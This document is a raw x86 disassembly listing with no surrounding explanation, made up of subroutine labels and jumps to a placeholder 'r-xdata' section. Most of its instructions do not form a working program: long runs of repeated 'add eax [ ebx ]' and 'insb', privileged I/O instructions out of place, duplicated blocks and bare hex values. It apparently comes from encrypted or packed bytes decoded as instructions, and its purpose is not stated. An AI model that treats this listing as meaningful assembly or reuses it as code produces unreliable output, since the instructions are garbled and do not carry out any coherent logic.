add edi [ edx - 0x24 ]
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
xchg ebx eax
insb
jpo r-xdata
dec edx
cmc
sbb cl dh
xor [ eax ] ebx
dec ecx
jpe r-xdata
insb
insb
retn
inc ebx
insb
insb
jpe r-xdata
adc [ eax ] 0xffffffef
mov bh 0x87
xchg edx eax
pushfd
push ss
jmp r-xdata
pop edx
insb
insb
sti
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
rol al 0x7a
scasb [ edi ]
sub al 0x6c
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
xchg ecx eax
insb
les ebx [ edi + 0x68104b18 ]
insb
jpe r-xdata
xor edi ecx
loopne r-xdata
into
insb
add eax [ ebx ]
add edi [ ebx - 0x6 ]
inc ebx
insb
insb
sti
jpe r-xdata
pop ebx
insb
insb
add ebx [ esi ]
push ss
das
imul ebp [ esp + ebp * 2 - 0x3d ] 0x6c69c07b
insb
adc [ edi - 0x4d ] dl
rol al 0x7a
cwde
jg r-xdata
shr [ ecx + 0x6c ] 0x6c
inc ebx
insb
insb
sti
stosd [ edi ]
outsb
mov ecx 0x59db7a01
insb
insb
add eax [ ebx ]
add edx [ esi + edx * 8 + 0x62 ]
stc
xchg ebx eax
stc
xchg ebx eax
push esp
salc
stc
xchg ebx eax
stc
xchg ebx eax
cmc
push esp
salc
push 0x6c
inc ebx
jpe r-xdata
mov [ edi - 0x3d ] al
int1
les ebx [ edx ]
adc eax 0x93939337
and [ esp + ebp * 2 + 0x3 ] ch
add eax [ ebx ]
jpo r-xdata
sub al 0x96
insb
add eax [ ebx ]
add eax [ ebx ]
pop esi
pop edi
out 0x55 eax
les ebx [ edx ]
adc eax 0x9393931b
jpo r-xdata
xchg ebx eax
xchg ebx eax
fwait
pop ebx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
salc
dec edi
rol bl 0x7a
mov eax 0x36c6c40
add eax [ ebx ]
add edi ecx
xchg edi eax
sti
xchg ebx eax
mov [ 0xffffffff962c9393 ] eax
sub_467c22
sbb [ ebp + 0x7b ] dl
pop esp
pop edi
insb
insb
adc [ edi - 0x7d ] dl
adc bh ch
into
xor edi ecx
loopne r-xdata
jpo r-xdata
dec edx
cmc
sbb cl dh
xor [ eax ] ebx
dec ecx
jpe r-xdata
insb
insb
retn
inc ebx
insb
insb
jpe r-xdata
mov bh 0x87
xchg edx eax
pushfd
push ss
jmp r-xdata
adc [ eax ] 0xffffffef
pop edx
insb
insb
sti
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
rol al 0x7a
scasb [ edi ]
sub al 0x6c
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
xchg ecx eax
insb
les ebx [ edi + 0x68104b18 ]
insb
jpe r-xdata
insb
add eax [ ebx ]
add edi [ ebx - 0x6 ]
inc ebx
insb
insb
sti
jpe r-xdata
pop ebx
insb
insb
add ebx [ esi ]
push ss
das
imul ebp [ esp + ebp * 2 - 0x3d ] 0x6c69c07b
insb
adc [ edi - 0x4d ] dl
rol al 0x7a
cwde
jg r-xdata
shr [ ecx + 0x6c ] 0x6c
inc ebx
insb
insb
sti
stosd [ edi ]
outsb
mov ecx 0x59db7a01
insb
insb
add eax [ ebx ]
add edx [ esi + edx * 8 + 0x62 ]
stc
xchg ebx eax
stc
xchg ebx eax
push esp
salc
stc
xchg ebx eax
stc
xchg ebx eax
cmc
push esp
salc
push 0x6c
inc ebx
jpe r-xdata
mov [ edi - 0x3d ] al
int1
les ebx [ edx ]
adc eax 0x93939337
and [ esp + ebp * 2 + 0x3 ] ch
add eax [ ebx ]
jpo r-xdata
sub al 0x96
insb
add eax [ ebx ]
add eax [ ebx ]
pop esi
pop edi
out 0x55 eax
les ebx [ edx ]
adc eax 0x9393931b
jpo r-xdata
xchg ebx eax
xchg ebx eax
fwait
pop ebx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
salc
dec edi
rol bl 0x7a
mov eax 0x36c6c40
add eax [ ebx ]
add edi ecx
xchg edi eax
sti
xchg ebx eax
mov [ 0xffffffff962c9393 ] eax
sub_467ddf
insb
insb
add eax [ ebx ]
jpe r-xdata
add eax [ ebx ]
cmc
sbb ch dh
jge r-xdata
and al 0x6c
cmc
int3
hlt
and ebp [ esp + ebp * 2 + 0x3 ]
add eax [ ebx ]
add ebp [ eax + 0x4c179c60 ]
das
insb
insb
insb
and al 0x4f
xchg ebx eax
xchg ebx eax
xchg ebx eax
rol ch 0x7a
das
jge r-xdata
add eax [ ebx ]
insb
add ebx [ esi + edx + 0x6c6c7caa ]
stosb [ edi ]
into
outsd
jpe r-xdata
push ss
pushad
and al 0x6c
insb
sti
inc esi
fdivr st7
mov cl 0x7a
sbb [ eax ] ebp
insb
insb
add eax [ ebx ]
add ebx [ ebx ]
xchg edi eax
stosb [ edi ]
jpe r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sub al 0xdd
out 0x93 eax
xchg ebx eax
cmc
test al 0x5c
pushfd
push ss
xchg edx eax
and ch [ esp + ebp * 2 + 0x10 ]
push ecx
xchg ecx eax
jpe r-xdata
insb
jl r-xdata
insb
adc [ edi - 0x7d ] dl
sbb dl bh
mov bh 0xb3
push ss
push ebx
jpe r-xdata
jb r-xdata
pushad
les esp [ edx + edi * 2 - 0x60 ]
jle r-xdata
insb
pop edx
insb
add eax [ ebx ]
add eax [ ebx ]
stc
xchg ecx eax
sti
xchg ebx eax
xchg ebx eax
xchg ebx eax
shr [ esi - 0x65 ] cl
insb
lds ebp [ ebx + 0x68104b18 ]
insb
jpe r-xdata
insb
insb
insb
jpe r-xdata
push ebx
jb r-xdata
insb
les ebx [ eax ]
arpl cx di
xchg ebx eax
insb
insb
add ebx [ esi ]
salc
outsd
retn
sbb ch dh
das
jpe r-xdata
cmc
adc [ ebx + 0x60169c93 ] ch
insb
add eax [ ebx ]
add ebx [ edi + edx - 0x6c6c6c62 ]
adc [ ebx - 0x6f ] dl
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
insb
loopne r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
insb
adc ah ch
fwait
xchg ebx eax
pushfd
pop ss
insb
and al 0x6c
insb
jpe r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb dl dh
jns r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb [ ecx - 0xb ] ch
sbb ch dh
sub ecx edi
out 0xcc al
cmc
sbb dh dl
je r-xdata
sbb [ ebp - 0x3c ] dl
jpo r-xdata
xchg ecx eax
pop edx
insb
insb
adc [ ebx - 0x2d ] ch
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
rcr [ edx ] cl
salc
outsd
jpe r-xdata
imul ebp [ esp + ebp * 2 + 0x3 ] 0x3
add eax [ ebx ]
add edi ecx
loope r-xdata
push ss
jpe r-xdata
stosd [ edi ]
push 0xe66c6c6c
lahf
insb
out 0x9b al
les ebp [ ebp + eax + 0x7 ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
salc
sbb dl dh
jg r-xdata
into
insb
sbb dl dh
ja r-xdata
add eax [ ebx ]
add ebp [ eax - 0x35 ]
dec ebx
insb
add eax [ ebx ]
pushad
insb
insb
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add edx [ eax ]
out dx eax
push esp
cmc
sbb dl dh
xchg ebx ecx
stc
cld
leave
jpe r-xdata
sbb dl dh
outsd
push ss
push ebx
xlat
pop ecx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb cl dh
sbb [ eax ] 0xce1af54c
mov ch 0x4e
insb
insb
0xd61a
out dx al
das
insb
pushfd
pop ss
mov bl 0x68
insb
insb
retn
jpe r-xdata
insb
pushfd
pop ss
sbb [ ebx + 0x16 ] ch
imul ebx [ edx ] 0xffffffd6
jpo r-xdata
salc
push esp
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
pushfd
adc [ ebp + 0x60 ] eax
insb
insb
stc
xchg ebx eax
jpe r-xdata
mov bh 0xb7
xchg ebx eax
and ebp [ esp + ebp * 2 + 0x3 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc bh ch
stc
loope r-xdata
sub [ esp + ebp * 2 + 0x3 ] ch
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
insb
pop ebp
insb
insb
sti
mul [ eax - 0x3c ]
jpe r-xdata
pushfd
pop ss
ficomp [ ecx + 0x547b9393 ]
imul ebp [ esp + ebp * 2 + 0x18 ] 0x9f7a9bde
insb
insb
add eax [ ebx ]
push ds
salc
cmp edi [ edx + 0x48 ]
xchg edi eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
and al 0xd5
xchg [ esi ] ebx
xlat
mov [ 0x1ad7f98b ] eax
salc
outsd
mov al [ 0x13d61e48 ]
rol bl 0x7a
or esp [ 0xffffffffc3036c6c ]
sbb dh dl
imul ebx [ eax ] 0x13
aaa
xchg ebx eax
xchg ebx eax
xchg ebx eax
adc [ ebx - 0x65 ] dl
retn
insb
insb
pushfd
pop ss
pop edx
mov bh 0x93
jl r-xdata
sub_468000
outsd
test al 0x50
pushfd
pop ss
ficomp [ ecx + 0x547b9393 ]
imul ebp [ esp + ebp * 2 + 0x18 ] 0x9f7a9bde
insb
insb
add eax [ ebx ]
push ds
salc
cmp edi [ edx + 0x48 ]
xchg edi eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
and al 0xd5
xchg [ esi ] ebx
xlat
mov [ 0x1ad7f98b ] eax
salc
outsd
mov al [ 0x13d61e48 ]
rol bl 0x7a
or esp [ 0xffffffffc3036c6c ]
sbb dh dl
imul ebx [ eax ] 0x13
aaa
xchg ebx eax
xchg ebx eax
xchg ebx eax
adc [ ebx - 0x65 ] dl
retn
sub_468068
dec esi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
xchg edi eax
insb
add eax [ ebx ]
adc [ edi - 0x79 ] dl
jpe r-xdata
insb
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cmc
adc [ ecx - 0x4be8636d ] ch
dec eax
insb
insb
jpe r-xdata
push ds
salc
dec edi
jpe r-xdata
xchg ecx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax esi
sbb [ edi - 0x3e ] bh
retn 0xd618
push esi
insb
insb
add ebp [ edx + 0x179c9fce ]
inc esi
popad
insb
insb
jpe r-xdata
add eax [ ebx ]
add ecx esp
int 0xc8
pop edx
push eax
add edx [ eax ]
push edi
mov ebx [ esi ]
salc
arpl bx ax
push ds
salc
cmp edi [ edx - 0x30 ]
and al 0x6c
insb
add eax [ ebx ]
sbb [ edx - 0x6c684f86 ] eax
xchg ebx eax
sbb ch dh
imul ebp [ ebp + eax * 8 - 0x55 ] 0x18
dec ebx
adc [ eax + 0x6c ] ch
pushfd
push ss
les edx [ eax + 0x6c ]
insb
mov al [ 0x7ad67a53 ]
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax edx
retn 0x7ac4
popad
insb
sub_4681a6
stc
std
cmc
sbb dl dh
jae r-xdata
jpe r-xdata
stc
div ch
sbb dl dh
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb dl [ 0xffffffff93939367 ]
sti
sub dl [ ss : edi ]
xchg ah al
jpo r-xdata
jb r-xdata
push ds
salc
pop ss
retn
stc

pop eax
insb
insb
jpe r-xdata
leave
insb
add eax ebx
jno r-xdata
push ecx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc dh ch
lahf
xchg ebx eax
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
and eax 0x9c54b869
pop ss
daa
xchg esi eax
xchg ebx eax
xchg ebx eax
int3
insd
insb
insb
int3
sub_4681b6
cmc
sbb dl dh
ja r-xdata
mov bl 0x7a
push ebp
pop ebx
insb
insb
stc
div ebp
sbb dl dh
jne r-xdata
add eax [ ebx ]
add eax [ ebx ]
add edx [ esi ]
push ebx
pushfd
push ss
rcl [ ebp + 0x5a7a9393 ] cl
inc esp
insb
insb
add eax [ ebx ]
add eax [ ebx ]
push ds
push ss
inc ebx
outsb
insb
insb
retn
fist [ ecx + 0x3039393 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb dl [ 0xffffffff93939367 ]
sti
sub dl [ ss : edi ]
xchg ah al
jpo r-xdata

pop eax
insb
insb
jpe r-xdata
jno r-xdata
push ecx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc dh ch
lahf
xchg ebx eax
jpe r-xdata
push ds
salc
pop ss
retn
stc
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
and eax 0x9c54b869
pop ss
daa
xchg esi eax
xchg ebx eax
xchg ebx eax
int3
insd
insb
insb
int3
sub_468259
rcr [ edx ] 0x26
inc ebx
outsb
insb
insb
insb
les eax [ ebx + 0x6c293c7a ]
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ ebp + 0x259c9d97 ]
imul edi [ eax + 0x27179c54 ] 0xcc939396
jpe r-xdata
jpe r-xdata
and [ esp + ebp * 2 + 0x3 ] ch
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx ebx
stc
jmp sub_4682ca
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]

pop esi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ esi ]
push ebx
pushfd
push ss
rcl [ ebp + 0x5a7a9393 ] cl
inc esp
insb
insb
add eax [ ebx ]
add eax [ ebx ]
push ds
push ss
inc ebx
outsb
insb
insb
retn
sub_4682ca
sub eax 0x3036c6c
push ds
fimul [ ebx - 0x3e ]
stc
shr [ ebp - 0x3d ] cl
sbb cl dh
dec ebx
insb
out 0x6f al
insb
out 0x77 al
insb
inc ebx
stc
xchg edi eax
sti
xchg ebx eax
mov [ 0xffffffffe56c9393 ] eax
retn
sub_468372
sbb [ edi + 0x7a ] bh
insd
jge r-xdata
add esi ebp
insb
add eax [ ebx ]
add eax [ ebx ]
add ecx esp
jpe r-xdata
add ebp [ eax + 0x50119c63 ]
push ecx
insb
insb
int3
outsd
insb
insb

sbb ch dh
and eax 0xf5ccdef9
sbb ch dh
sub edi [ edx - 0x5 ]
push 0x3036c6c
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc ch [ ebp - 0x6c6c293d ]
pushfd
push ss
mov dl [ esi + 0x6c ]
insb
jpe r-xdata
insb
add eax [ ebx ]
cmc
imul ebp [ esp + ebp * 2 + 0x3 ] 0x3030303
pushfd
sbb eax 0x93939390
mov al [ 0x350d353 ]
add eax [ ebx ]
add eax [ ebx ]
sub_46840f
stc
div ch
sbb dl dh
jpo r-xdata
insb
insb
add eax [ ebx ]
cmc
sbb ch dh
stc
std
cmc
sbb dl dh
jns r-xdata
add ebp [ eax + 0x50119c63 ]
push ecx
insb
insb
int3
outsd
insb
insb

and eax 0xf5ccdef9
sbb ch dh
stc
out 0xf5 eax
sbb dl dh
jg r-xdata
sub edi [ edx - 0x5 ]
push 0x3036c6c
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc ch [ ebp - 0x6c6c293d ]
pushfd
push ss
mov dl [ esi + 0x6c ]
insb
jpe r-xdata
stc
cli
cmc
sbb dl dh
jge r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ edx ]
lodsd [ esi ]
retn
stc
cmc
cmc
sbb dl dh
arpl bx cx
stc
cli
cmc
sbb dl dh
popad

sub_46843b
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb dh dl
fwait
insb
retn
sub_468507
fadd st5
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
0x5316
sub ebp [ esp + ebp * 2 + 0x3 ]
add eax [ ebx ]
push ds
pop ss
mov bh 0x3
xchg ebx eax
xchg ebx eax
xchg ebx eax
retn
sub_468519
sti
xchg edi eax
xchg edx eax
xchg ebx eax
xchg ebx eax
insb
add eax 0x9393932b
push ss
push ebx
pushfd
pop ss
dec esi
inc ebp
insb
insb
push ds
les edx [ ebp + 0x6c4d467a ]
insb
pushfd
adc eax 0x6c6c4b56
lds ebx [ eax ]
out 0x9b al
sbb [ ebp - 0x6c6c7286 ] edx
xchg ebx eax
add eax [ ebx ]
add eax ebp
sbb [ ebx + 0x7a ] ah
mov eax 0x36c6c4f
add edi [ ebx - 0x1c ]
push 0x57106c6c
lahf
jpe r-xdata
or al 0x40
sub [ esp + ebp * 2 + 0x3 ] ch
add eax [ ebx ]
add edi [ edx - 0x3a ]
push 0x6c
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx edx
push ss
push ebx
pushfd
pop ss
xor al 0x40
insb
insb
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
push ss
xor esp [ esi + 0x6c ]
insb
rol bl 0x7b
cdq
push 0x57106c6c
lahf
lds edi [ ebx - 0x12 ]
dec ebp
insb
js r-xdata
jpe r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
salc
and edi [ edx + 0x42 ]
inc eax
sub [ eax + 0x6c ] al
insb
mov al [ 0xffffffff9c505a53 ]
pop ss
mov esp 0x7a6c6c47
push esp
insb
insb
add edi ebx
xchg ebx eax
xchg ebx eax
xchg ebx eax
adc edi [ edx - 0x34 ]
dec esi
insb
insb
add eax [ ebx ]
sbb [ ebx + 0x16 ] cl
insb
add eax [ ebx ]
add eax [ ebx ]
insb
0x5316
dec ebx
insb
insb
add eax [ ebx ]
add ebx [ edi + edx + 0x6c6c3942 ]
pushfd
and al 0x91
jpe r-xdata
retn
dec edi
insb
insb
add ebp [ edi + edx * 8 - 0x49 ]
xchg [ eax ] ebx
xlat
mov bh 0x87
test al 0xd4
xchg edi eax
pushfd
adc [ ebx + 0x3a ] edi
insb
insb
mov al [ 0xffffffffb7d71a53 ]
xchg ebp esi
stosb [ edi ]
rcl ch 0x1
pushfd
pop ss
mov al 0x64
insb
insb
sub al 0x2b
cwde
xchg ebx eax
xchg ebx eax
jpe r-xdata
insb
pushfd
pop ss
dec esp
insb
insb
push ss
dec eax
pushfd
pop ss
dec esp
insb
insb
jpe r-xdata
add ebx [ eax ]
dec ebx
push ss
inc edx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx + 0x60 ]
and eax 0x3036c6c
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ ebp + eax * 8 - 0x65 ]
push ds
push ss
das
imul ebp [ esp + ebp * 2 - 0x3d ] 0x1ebfc56c
push ss
pop ebx
outsb
insb
insb
retn
sub_4685d4
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edi + edx + 0x6c6c405d ]
push ds
fisubr [ ebx ]
push ds
salc
cmp edi [ ebx - 0x76 ]
push 0x53166c6c
pushfd
pop ss
sub [ eax + 0x6c ] al
insb
mov al [ 0xffffffff9c505a53 ]
pop ss
mov esp 0x7a6c6c47
push esp
insb
insb
add edi ebx
xchg ebx eax
xchg ebx eax
xchg ebx eax
adc edi [ edx - 0x34 ]
dec esi
insb
insb
add eax [ ebx ]
sbb [ ebx + 0x16 ] cl
retn
dec edi
insb
insb
add ebp [ edi + edx * 8 - 0x49 ]
xchg [ eax ] ebx
xlat
mov bh 0x87
test al 0xd4
xchg edi eax
pushfd
adc [ ebx + 0x3a ] edi
insb
insb
mov al [ 0xffffffffb7d71a53 ]
xchg ebp esi
stosb [ edi ]
rcl ch 0x1
pushfd
pop ss
mov al 0x64
insb
insb
sub al 0x2b
cwde
xchg ebx eax
xchg ebx eax
jpe r-xdata
insb
pushfd
pop ss
dec esp
insb
insb
push ss
dec eax
pushfd
pop ss
dec esp
insb
insb
jpe r-xdata
add ebx [ eax ]
dec ebx
push ss
inc edx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx + 0x60 ]
and eax 0x3036c6c
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ ebp + eax * 8 - 0x65 ]
push ds
push ss
das
imul ebp [ esp + ebp * 2 - 0x3d ] 0x1ebfc56c
push ss
pop ebx
outsb
insb
insb
retn
sub_4686b7
and ch [ esp + ebp * 2 + 0x3 ]
nop
push 0xffffff90
dec edx
nop
bound ebx [ edx ]
salc
imul edx [ esi ] 0x53
pushfd
push ss
push ds
cmp ch [ esp + ebp * 2 - 0x60 ]
push ebx
int3
sub_4686f5
push 0x7a7a6c6c
inc ecx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ esp + eax * 8 - 0x21 ]
push ss
push ebx
pushfd
pop ss
inc edi
dec esp
insb
insb
stc
mov cl 0xcb
stc
mov dh 0xf5
sbb dl dh
jae r-xdata
pop ss
sbb edi [ ebx ]
insb
insb
sar [ edx + 0x3 ] 0x6a
insb
insb
add ebx [ esi ]
push ss
stc
loopne r-xdata
push ebp
salc
imul edx [ ebx + 0x18dbc56c ] 0x9c48164b
dec esi
sub eax 0x18036c6c
push ebp
cmc
sbb dl dh

pop ss
xor [ esp + ebp * 2 ] 0x6c
sti
mov esp 0xc00d76ca
sbb cl [ 0xffffffff93939343 ]
jpo r-xdata
pushfd
push esi
insb
insb
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sti
jb r-xdata
xor eax 0x3036c6c
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
leave
cmc
sbb al dh
or eax 0x39d61af5
sbb [ ebp - 0x60 ] al
push ebx
stc
out 0xf5 eax
sbb al dh
xor ecx ecx
cmc
sbb bl dh
xor eax 0x6c53577a
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ebx
push esp
and al ah
sbb dl ch
jmp r-xdata
insb
insb
mov al [ 0x5ac8cd53 ]
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
push ss
and al 0x6f
insb
insb
push ds
salc
xor eax ebx
sbb [ ebp + 0x7b ] dl
dec ebx
pop ebx
insb
insb
0x5316
sub_46872a
cmc
sbb dl dh
imul edi [ edx - 0x4e ] 0x2b
insb
insb
add ebx [ eax ]
push 0x10
insb
xchg edx eax
jpe r-xdata
insb
insb
sti
inc ebx
add [ ebx + 0x14 ] esp
les ebx [ edx ]
aad 0xff
jpo r-xdata
and ebp [ esp + ebp * 2 - 0x3a ]
sbb [ edi - 0x3e ] bh
retn 0xa0c0
add eax [ ebx ]
add eax [ ebx ]
leave
cmc
sbb al dh
or eax 0x39d61af5
sbb [ ebp - 0x60 ] al
push ebx
stc
out 0xf5 eax
sbb al dh
xor ecx ecx
cmc
sbb bl dh
xor eax 0x6c53577a
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ebx
push esi
insb
insb
sti
push es
jbe r-xdata
push esi
insb
insb
jpe r-xdata
push esp
and al ah
sbb dl ch
jmp r-xdata
inc ebx
xchg ebx eax
xchg ebx eax
xchg ebx eax
add al 0xc4
jpe r-xdata
jb r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sti
xor eax 0x3036c6c
add eax [ ebx ]
add eax [ ebx ]
insb
insb
mov al [ 0x5ac8cd53 ]
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
push ss
and al 0x6f
insb
insb
push ds
salc
xor eax ebx
sbb [ ebp + 0x7b ] dl
dec ebx
pop ebx
insb
insb
0x5316
jpo r-xdata
pushfd
pop ss
xor [ esp + ebp * 2 ] 0x6c
sti
mov esp 0xc00d76ca
sbb cl [ 0xffffffff93939343 ]
in al dx
xor eax 0x3036c6c
pushfd
and al 0x82
cmc
sbb al [ ebx + 0x6c41097a ]
insb
push esp
salc
